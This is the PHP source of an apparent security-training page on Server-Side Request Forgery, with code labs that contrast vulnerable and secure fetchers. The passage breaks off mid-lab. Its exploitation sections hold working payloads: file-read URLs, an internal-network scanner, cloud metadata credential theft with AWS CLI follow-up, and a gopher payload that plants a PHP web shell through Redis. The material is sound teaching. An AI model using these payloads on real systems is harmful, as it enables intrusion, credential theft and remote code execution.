<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

$pageTitle = "Server-Side Request Forgery (SSRF) - Complete Guide | DarkHunter";
$currentPage = "ssrf-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master SSRF vulnerabilities - Understanding Server-Side Request Forgery attacks and implementing robust defenses. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/ssrf-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/file-upload-info.php"><i>📤</i> File Upload</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">Server-Side Request Forgery (SSRF)</h1>
        <p class="page-subtitle">
          Master SSRF vulnerabilities - Learn how attackers force servers to make unintended requests to internal
          services, cloud metadata APIs, and external systems. Understand defense strategies to protect your
          infrastructure.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is SSRF?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is Server-Side Request Forgery (SSRF)?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Server-Side Request Forgery (SSRF) is a web security vulnerability that allows
          an attacker to induce the server-side application to make requests to an unintended location. This enables
          attackers to bypass network boundaries, access internal services, scan internal networks, and potentially
          execute commands on internal systems.
        </div>

        <p class="text-content">
          SSRF is one of the most critical vulnerabilities in modern cloud-native architectures. Unlike client-side
          attacks, SSRF exploits the server's privileged position in the network. The server often has access to
          internal services, cloud metadata endpoints, and backend APIs that are not accessible from the public
          internet. By controlling URLs that the server fetches, attackers can pivot into the internal network and
          access sensitive resources.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> SSRF can lead to internal network reconnaissance, cloud metadata
          extraction (AWS credentials, database passwords), internal service exploitation, remote code execution via
          internal APIs, and data exfiltration from internal systems. In cloud environments, SSRF is often a direct
          path to account takeover and infrastructure compromise.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 7.5 - 10.0 (High to Critical)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low to Medium (depends on network topology)</li>
            <li><strong>Privileges Required:</strong> Low (often any authenticated user)</li>
            <li><strong>User Interaction:</strong> None (direct server manipulation)</li>
            <li><strong>Scope:</strong> Changed (can affect internal network beyond application)</li>
            <li><strong>Impact:</strong> High on Confidentiality, Integrity, and Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of SSRF</h3>
        <p class="text-content">
          SSRF manifests in different forms based on what the attacker can control and what information is returned:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Description</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Basic SSRF</td>
              <td style="padding: 0.75rem;">Server returns response body to attacker</td>
              <td style="padding: 0.75rem;">Full response disclosure</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Blind SSRF</td>
              <td style="padding: 0.75rem;">No direct response, inferred via side channels</td>
              <td style="padding: 0.75rem;">Network scanning, internal probing</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Semi-Blind SSRF</td>
              <td style="padding: 0.75rem;">Error messages or timing reveal information</td>
              <td style="padding: 0.75rem;">Limited information disclosure</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Cloud SSRF</td>
              <td style="padding: 0.75rem;">Targeting cloud metadata endpoints</td>
              <td style="padding: 0.75rem;">Credential theft, account takeover</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 SSRF Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Web App → Internal Network → Metadata API → Database]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How SSRF Works: Technical Deep Dive</h2>

        <h3 class="subsection-title">The Server as a Proxy</h3>
        <p class="text-content">
          SSRF exploits the server's ability to make HTTP requests on behalf of users. When an application accepts
          user-controlled URLs and fetches them server-side without proper validation, the attacker gains a proxy
          into the internal network with the server's privileges.
        </p>

        <div class="highlight-box">
          <strong>Vulnerability Pattern:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Application accepts user input as a URL (image URL, webhook, file import)</li>
            <li>Server makes HTTP request to the provided URL</li>
            <li>Response is processed or returned to user</li>
            <li><strong>Missing Step:</strong> URL validation and whitelist enforcement</li>
            <li>Attacker supplies internal URLs instead of expected external URLs</li>
          </ol>
        </div>

        <h3 class="subsection-title">Common SSRF Entry Points</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Common Vulnerable Patterns</span></div>
          <pre><code><span class="code-comment">-- Image/File fetching from user-provided URL</span>
<span class="code-string">GET /fetch-image?url=https://example.com/image.jpg</span>

<span class="code-comment">-- Webhook configuration</span>
<span class="code-string">POST /webhooks</span>
{ <span class="code-attr">"callback_url"</span>: <span class="code-string">"https://internal.api.local/admin"</span> }

<span class="code-comment">-- PDF generation from HTML</span>
<span class="code-string">POST /generate-pdf</span>
{ <span class="code-attr">"html"</span>: <span class="code-string">"&lt;img src='http://169.254.169.254/latest/meta-data/'&gt;"</span> }

<span class="code-comment">-- URL preview/scanning</span>
<span class="code-string">GET /preview?url=http://localhost:8080/admin</span>

<span class="code-comment">-- File import from URL</span>
<span class="code-string">POST /import</span>
{ <span class="code-attr">"source"</span>: <span class="code-string">"http://192.168.1.1:22/"</span> }  <span class="code-comment">-- SSH banner grabbing!</span></code></pre>
        </div>

        <h3 class="subsection-title">Cloud Metadata Endpoints</h3>
        <p class="text-content">
          Cloud providers expose metadata APIs via non-routable IP addresses. These endpoints contain sensitive
          credentials and configuration data that SSRF can access.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Cloud Metadata Endpoints</span></div>
          <pre><code><span class="code-comment">-- AWS EC2 Metadata Service (IMDSv1 - vulnerable)</span>
<span class="code-string">http://169.254.169.254/latest/meta-data/</span>
<span class="code-string">http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</span>

<span class="code-comment">-- AWS IMDSv2 (requires token, but still exploitable)</span>
<span class="code-string">PUT http://169.254.169.254/latest/api/token</span>
<span class="code-string">X-aws-ec2-metadata-token-ttl-seconds: 21600</span>

<span class="code-comment">-- Google Cloud Metadata</span>
<span class="code-string">http://metadata.google.internal/computeMetadata/v1/</span>
<span class="code-string">http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token</span>

<span class="code-comment">-- Azure Metadata</span>
<span class="code-string">http://169.254.169.254/metadata/instance?api-version=2021-02-01</span>

<span class="code-comment">-- DigitalOcean</span>
<span class="code-string">http://169.254.169.254/metadata/v1.json</span>

<span class="code-comment">-- Alibaba Cloud</span>
<span class="code-string">http://100.100.100.200/latest/meta-data/</span></code></pre>
        </div>

        <h3 class="subsection-title">Protocol Smuggling</h3>
        <p class="text-content">
          SSRF isn't limited to HTTP. Attackers can leverage other protocols supported by URL fetchers to interact
          with internal services.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Protocol Abuse in SSRF</span></div>
          <pre><code><span class="code-comment">-- File protocol (read local files)</span>
<span class="code-string">file:///etc/passwd</span>
<span class="code-string">file:///proc/self/environ</span>
<span class="code-string">file:///var/www/html/config.php</span>

<span class="code-comment">-- FTP protocol</span>
<span class="code-string">ftp://internal.ftp.server/private/file.txt</span>

<span class="code-comment">-- Gopher protocol (send raw TCP data)</span>
<span class="code-string">gopher://internal.redis:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a</span>

<span class="code-comment">-- Dict protocol</span>
<span class="code-string">dict://internal.host:11211/stats</span>  <span class="code-comment">-- Memcached</span>

<span class="code-comment">-- LDAP protocol</span>
<span class="code-string">ldap://internal.dc:389/%00</span>  <span class="code-comment">-- LDAP injection</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">🎯</div>
            <div class="flow-label">Find Entry Point</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Identify URL parameters</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🔗</div>
            <div class="flow-label">Inject Internal URL</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">169.254.169.254 or localhost
            </p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">☁️</div>
            <div class="flow-label">Access Metadata</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Extract IAM credentials</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🔑</div>
            <div class="flow-label">Escalate Privileges</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Use stolen credentials</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💀</div>
            <div class="flow-label">Full Compromise</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Account/infrastructure takeover
            </p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting SSRF</h2>

        <h3 class="subsection-title">Step 1: Identify Potential SSRF Entry Points</h3>
        <p class="text-content">
          Map all application features that fetch external resources or process URLs. Look for parameters that
          accept URLs, IP addresses, or hostnames.
        </p>

        <div class="highlight-box">
          <strong>Common SSRF Parameters:</strong>
          <ul style="margin-left: 2rem;">
            <li><code>url</code>, <code>uri</code>, <code>link</code>, <code>src</code>, <code>dest</code></li>
            <li><code>callback</code>, <code>webhook</code>, <code>redirect</code></li>
            <li><code>path</code>, <code>file</code>, <code>document</code>, <code>html</code></li>
            <li><code>server</code>, <code>host</code>, <code>ip</code>, <code>port</code></li>
            <li><code>feed</code>, <code>import</code>, <code>upload</code>, <code>fetch</code></li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Basic SSRF Detection</h3>
        <p class="text-content">
          Test for SSRF by providing internal URLs and observing behavior differences between valid and invalid
          internal addresses.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">SSRF Detection Payloads</span></div>
          <pre><code><span class="code-comment">-- Test for localhost access</span>
<span class="code-string">?url=http://127.0.0.1/</span>
<span class="code-string">?url=http://localhost/</span>
<span class="code-string">?url=http://0.0.0.0/</span>
<span class="code-string">?url=http://[::1]/</span>

<span class="code-comment">-- Test for internal IP ranges</span>
<span class="code-string">?url=http://192.168.1.1/</span>  <span class="code-comment">-- Common router</span>
<span class="code-string">?url=http://10.0.0.1/</span>     <span class="code-comment">-- Internal network</span>
<span class="code-string">?url=http://172.16.0.1/</span>   <span class="code-comment">-- Docker default</span>

<span class="code-comment">-- Test for cloud metadata</span>
<span class="code-string">?url=http://169.254.169.254/</span>

<span class="code-comment">-- Test with different protocols</span>
<span class="code-string">?url=file:///etc/passwd</span>
<span class="code-string">?url=dict://localhost:11211/</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Internal Network Scanning</h3>
        <p class="text-content">
          Use Burp Intruder or custom scripts to scan internal IP ranges and identify active services.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Burp Intruder SSRF Scan</span></div>
          <pre><code><span class="code-comment">-- Target: GET /fetch?url=http://192.168.1.§1§:§2§</span>
<span class="code-comment">-- Payload 1: Numbers 1-254 (IP octet)</span>
<span class="code-comment">-- Payload 2: Common ports [80, 443, 8080, 22, 3306, 6379, 5432]</span>

<span class="code-comment">-- Python scanning script</span>
<span class="code-keyword">import</span> requests

<span class="code-keyword">def</span> <span class="code-function">scan_internal</span>(target_url, ip_range):
    <span class="code-keyword">for</span> i <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">1</span>, <span class="code-keyword">255</span>):
        url = <span class="code-string">f"{target_url}?url=http://192.168.1.{i}/"</span>
        resp = requests.<span class="code-function">get</span>(url, timeout=<span class="code-keyword">5</span>)
        <span class="code-keyword">if</span> resp.status_code == <span class="code-keyword">200</span>:
            <span class="code-function">print</span>(<span class="code-string">f"[+] Host found: 192.168.1.{i}"</span>)
            <span class="code-function">print</span>(<span class="code-string">f"    Length: {len(resp.text)}"</span>)

<span class="code-comment">-- Time-based detection for blind SSRF</span>
<span class="code-string">?url=http://192.168.1.1:8080/</span>  <span class="code-comment">-- Fast response = port open</span>
<span class="code-string">?url=http://192.168.1.1:9999/</span>  <span class="code-comment">-- Slow/timeout = port filtered</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Cloud Metadata Extraction</h3>
        <p class="text-content">
          Target cloud metadata endpoints to extract IAM credentials and instance information.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">AWS Metadata Extraction</span></div>
          <pre><code><span class="code-comment">-- Step 1: Get IAM role name</span>
<span class="code-string">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
<span class="code-comment">-- Response: my-ec2-role</span>

<span class="code-comment">-- Step 2: Get temporary credentials</span>
<span class="code-string">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role</span>
<span class="code-comment">-- Response:</span>
{
    <span class="code-attr">"Code"</span>: <span class="code-string">"Success"</span>,
    <span class="code-attr">"Type"</span>: <span class="code-string">"AWS-HMAC"</span>,
    <span class="code-attr">"AccessKeyId"</span>: <span class="code-string">"ASIAIOSFODNN7EXAMPLE"</span>,
    <span class="code-attr">"SecretAccessKey"</span>: <span class="code-string">"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</span>,
    <span class="code-attr">"Token"</span>: <span class="code-string">"FwoGZXIvYXdzEBYaDK..."</span>,
    <span class="code-attr">"Expiration"</span>: <span class="code-string">"2024-12-31T23:59:59Z"</span>
}

<span class="code-comment">-- Step 3: Use credentials with AWS CLI</span>
<span class="code-string">aws sts get-caller-identity --profile stolen</span>
<span class="code-string">aws s3 ls --profile stolen</span>
<span class="code-string">aws ec2 describe-instances --profile stolen</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Advanced SSRF with Protocol Smuggling</h3>

        <h4>Redis via Gopher</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Gopher Protocol Attack</span></div>
          <pre><code><span class="code-comment">-- Redis command to write web shell</span>
<span class="code-string">CONFIG SET dir /var/www/html</span>
<span class="code-string">CONFIG SET dbfilename shell.php</span>
<span class="code-string">SET payload "&lt;?php system($_GET['cmd']); ?&gt;"</span>
<span class="code-string">SAVE</span>

<span class="code-comment">-- URL-encoded gopher payload</span>
<span class="code-string">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a&lt;?php%20system($_GET[%27cmd%27]);%20?&gt;%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0aquit%0d%0a</span></code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: SSRF Exploitation with Burp Suite</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step SSRF exploitation from detection to cloud metadata extraction]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious SSRF Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Capital One Data Breach (2019)</h3>
        <p class="text-content">
          One of the largest data breaches in history affecting 100 million customers. An attacker exploited an SSRF
          vulnerability in Capital One's AWS infrastructure to access the EC2 metadata service, obtain IAM role
          credentials, and subsequently access S3 buckets containing sensitive customer data.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> 100 million customer records exposed, including names, addresses, phone numbers,
          email addresses, dates of birth, and self-reported income. Cost: $190 million settlement plus reputational
          damage.
        </div>

        <h3 class="subsection-title">Case Study 2: Shopify SSRF to RCE (2020)</h3>
        <p class="text-content">
          Security researchers discovered an SSRF vulnerability in Shopify's image processing functionality. By
          manipulating the image URL parameter, they accessed internal services including AWS metadata, Kubernetes
          API, and internal admin panels. The vulnerability could be chained to achieve remote code execution.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Image URL SSRF → AWS metadata credentials → EKS Kubernetes API access →
          Pod execution → Full cluster compromise.
        </div>

        <h3 class="subsection-title">Case Study 3: Uber Account Takeover via SSRF (2017)</h3>
        <p class="text-content">
          Researchers found that Uber's "Share Trip" feature was vulnerable to SSRF. By manipulating the callback URL,
          they could make requests to internal services, including the internal admin panel and AWS metadata service,
          leading to sensitive data exposure.
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Access to internal admin panels, potential for mass account takeover, and
          unauthorized access to trip data. Uber paid a significant bug bounty for this finding.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">SSRF Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cloud/SaaS</td>
              <td style="padding: 0.75rem;">Extract IAM credentials from metadata service</td>
              <td style="padding: 0.75rem;">Complete cloud account takeover</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Fintech</td>
              <td style="padding: 0.75rem;">Access internal banking APIs and transaction services</td>
              <td style="padding: 0.75rem;">Financial fraud, data theft</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Healthcare</td>
              <td style="padding: 0.75rem;">Access internal patient databases via internal APIs</td>
              <td style="padding: 0.75rem;">HIPAA violations, privacy breach</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Access internal inventory/pricing APIs</td>
              <td style="padding: 0.75rem;">Data theft, price manipulation</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Enterprise</td>
              <td style="padding: 0.75rem;">Pivot to internal Active Directory or LDAP</td>
              <td style="padding: 0.75rem;">Domain compromise, lateral movement</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper URL validation enables SSRF attacks, then
          implement robust URL parsing, whitelist validation, and network segmentation.
        </div>

        <h3 class="subsection-title">Lab 1: Basic SSRF in Image Fetcher</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Direct use of user-provided URL without validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: Direct use of user URL</span>
<span class="code-keyword">$url</span> = <span class="code-keyword">$_GET</span>[<span class="code-string">'url'</span>];

<span class="code-comment">// DANGEROUS: No validation - fetches any URL</span>
<span class="code-keyword">$image</span> = <span class="code-function">file_get_contents</span>(<span class="code-keyword">$url</span>);

<span class="code-comment">// Save and display</span>
<span class="code-function">file_put_contents</span>(<span class="code-string">'/tmp/image.jpg'</span>, <span class="code-keyword">$image</span>);
<span class="code-keyword">echo</span> <span class="code-string">"&lt;img src='/tmp/image.jpg'&gt;"</span>;

<span class="code-comment">// Attacker can use:</span>
<span class="code-comment">// ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
<span class="code-comment">// ?url=file:///etc/passwd</span>
<span class="code-comment">// ?url=http://localhost:8080/admin</span>
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">fetchImageSecurely</span>(<span class="code-keyword">$url</span>) {
    <span class="code-comment">// Parse URL components</span>
    <span class="code-keyword">$parsed</span> = <span class="code-function">parse_url</span>(<span class="code-keyword">$url</span>);
    
    <span class="code-comment">// Whitelist allowed schemes</span>
    <span class="code-keyword">$allowed_schemes</span> = [<span class="code-string">'http'</span>, <span class="code-string">'https'</span>];
    <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'scheme'</span>], <span class="code-keyword">$allowed_schemes</span>)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid URL scheme"</span>);
    }
    
    <span class="code-comment">// Resolve hostname to IP</span>
    <span class="code-keyword">$hostname</span> = <span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>];
    <span class="code-keyword">$ip</span> = <span class="code-function">gethostbyname</span>(<span class="code-keyword">$hostname</span>);
    
    <span class="code-comment">// Block private IP ranges</span>
    <span class="code-keyword">if</span> (<span class="code-function">filter_var</span>(<span class="code-keyword">$ip</span>, <span class="code-function">FILTER_VALIDATE_IP</span>, <span class="code-function">FILTER_FLAG_NO_PRIV_RANGE</span> | <span class="code-function">FILTER_FLAG_NO_RES_RANGE</span>) === <span class="code-keyword">false</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Private IP addresses not allowed"</span>);
    }
    
    <span class="code-comment">// Use allowlist for domains (preferred over blacklist)</span>
    <span class="code-keyword">$allowed_domains</span> = [<span class="code-string">'cdn.example.com'</span>, <span class="code-string">'images.example.com'</span>];
    <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$hostname</span>, <span class="code-keyword">$allowed_domains</span>)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Domain not in allowlist"</span>);
    }
    
    <span class="code-comment">// Fetch with timeout and size limits</span>
    <span class="code-keyword">$context</span> = <span class="code-function">stream_context_create</span>([
        <span class="code-string">'http'</span> => [
            <span class="code-string">'timeout'</span> => <span class="code-keyword">10</span>,
            <span class="code-string">'max_redirects'</span> => <span class="code-keyword">0</span>,  <span class="code-comment">// Prevent redirect-based SSRF</span>
            <span class="code-string">'user_agent'</span> => <span class="code-string">'SecureImageFetcher/1.0'</span>
        ]
    ]);
    
    <span class="code-keyword">$image</span> = @<span class="code-function">file_get_contents</span>(<span class="code-keyword">$url</span>, <span class="code-keyword">false</span>, <span class="code-keyword">$context</span>);
    
    <span class="code-comment">// Validate it's actually an image</span>
    <span class="code-keyword">$finfo</span> = <span class="code-keyword">new</span> <span class="code-function">finfo</span>(<span class="code-function">FILEINFO_MIME_TYPE</span>);
    <span class="code-keyword">$mime</span> = <span class="code-keyword">$finfo</span>-><span class="code-function">buffer</span>(<span class="code-keyword">$image</span>);
    <span class="code-keyword">$allowed_mimes</span> = [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'image/gif'</span>];
    
    <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$mime</span>, <span class="code-keyword">$allowed_mimes</span>)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid image format"</span>);
    }
    
    <span class="code-keyword">return</span> <span class="code-keyword">$image</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure Webhook Implementation</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> Webhooks that can target internal services.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Webhook</span></div>
          <pre><code><span class="code-comment">// Vulnerable: No restrictions on webhook URL</span>
<span class="code-keyword">app.post</span>(<span class="code-string">'/webhooks'</span>, <span class="code-keyword">async</span> (<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    <span class="code-keyword">const</span> { url, events } = req.body;
    
    <span class="code-comment">// DANGEROUS: Stores and calls any URL</span>
    <span class="code-keyword">await</span> Webhook.<span class="code-function">create</span>({ url, events });
    
    <span class="code-comment">// Later, when event fires:</span>
    <span class="code-keyword">await</span> axios.<span class="code-function">post</span>(url, eventData);  <span class="code-comment">// Can hit internal services!</span>
});</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Webhook</span></div>
          <pre><code><span class="code-keyword">const</span> dns = <span class="code-function">require</span>(<span class="code-string">'dns'</span>);
<span class="code-keyword">const</span> { URL } = <span class="code-function">require</span>(<span class="code-string">'url'</span>);
